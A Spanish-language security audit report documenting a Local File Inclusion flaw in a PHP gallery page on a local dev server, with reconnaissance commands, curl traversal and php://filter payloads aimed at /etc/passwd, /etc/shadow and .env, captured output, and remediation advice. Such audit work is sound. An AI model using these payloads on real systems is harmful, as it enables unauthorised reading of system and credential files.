# Informe de Auditoría: Local File Inclusion (LFI)

Fecha: 2026-04-27T06:04:41Z
Objetivo: http://web.dev.local:8081

Resumen ejecutivo
-----------------
Se identificó y explotó una vulnerabilidad de Local File Inclusion (LFI) en la aplicación web objetivo. Mediante traversal de directorios en el parámetro "page" de gallery.php fue posible leer ficheros sensibles del sistema (por ejemplo /etc/passwd). Además se observaron mensajes de error de PHP que filtran la ruta absoluta del fichero vulnerable (/var/www/html/gallery.php), lo que facilita la explotación.

Detalles técnicos
-----------------
- URL vulnerable: http://web.dev.local:8081/gallery.php
- Parámetro vulnerable: page
- Prueba de lectura exitosas:
  - /etc/passwd (contenido leído)
  - Intento de /etc/shadow -> falló con "Permission denied" pero mostró Path Disclosure en el warning.

Comandos y herramientas utilizados
---------------------------------
(Se utilizaron herramientas del ecosistema Kali; aquí se reproducen con curl/gobuster para replicación)

Reconocimiento (dir busting):
- gobuster dir -u http://web.dev.local:8081 -w /usr/share/wordlists/dirb/common.txt -q -t 50

Pruebas LFI (ejemplos de payloads usados):
- curl 'http://web.dev.local:8081/gallery.php?page=../../../../etc/passwd'
- curl 'http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=../../../../etc/passwd'
- curl 'http://web.dev.local:8081/gallery.php?page=../../../../.env'
- curl 'http://web.dev.local:8081/gallery.php?page=../../../../etc/shadow'

Evidencias y salidas relevantes
-------------------------------
- Respuesta mostrando /etc/passwd (fragmento):
  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

- Intento de /etc/shadow devolvió warnings con Path Disclosure (ruta absoluta del archivo PHP):
  Warning: include(/etc/shadow): Failed to open stream: Permission denied in /var/www/html/gallery.php on line 104

- Uso de wrapper php://filter para obtener base64 del /etc/passwd también produjo salida codificada en base64 que decodificada reproduce el fichero.

Impacto
-------
- Información obtenida: cuentas de sistema listadas en /etc/passwd y path disclosure a /var/www/html/gallery.php.
- Impacto inicial: acceso a información de sistema (enumeración de usuarios), posible ayuda para escalada posterior.
- /etc/shadow no fue legible por permisos, pero con técnicas adicionales (log poisoning, RFI->LFI + include de logs, o explotación de otros vectores) podría intentarse escalada a RCE; no se alcanzó RCE en esta evaluación.

Recomendaciones
---------------
- Validar y sanear estrictamente el parámetro `page` usando una lista blanca de valores permitidos (no incluir rutas suministradas por el usuario).
- Evitar incluir archivos directamente desde entradas no confiables; usar mapping de nombres lógicos a ficheros internos.
- Deshabilitar allow_url_include y restringir open_basedir si aplica; asegurar que PHP no muestre errores en producción (display_errors=Off) y loguee internamente.
- Asegurar permisos de fichero mínimos y desplegar la web con un usuario con privilegios limitados.

Comandos reproducibles (resumen)
--------------------------------
1) Descubrimiento de directorios:
   gobuster dir -u http://web.dev.local:8081 -w /usr/share/wordlists/dirb/common.txt -q -t 50
2) Confirmación LFI (leer /etc/passwd):
   curl 'http://web.dev.local:8081/gallery.php?page=../../../../etc/passwd'
3) Obtener base64 via php://filter:
   curl 'http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=../../../../etc/passwd' | base64 -d

Conclusión
----------
La aplicación presenta una vulnerabilidad LFI explotable a través del parámetro `page` en gallery.php que permite la lectura de ficheros sensibles del sistema (confirmado con /etc/passwd). Debido a la lectura de /etc/passwd y la posibilidad de técnicas de escalada, se considera que la vulnerabilidad está explotada en la presente evaluación.

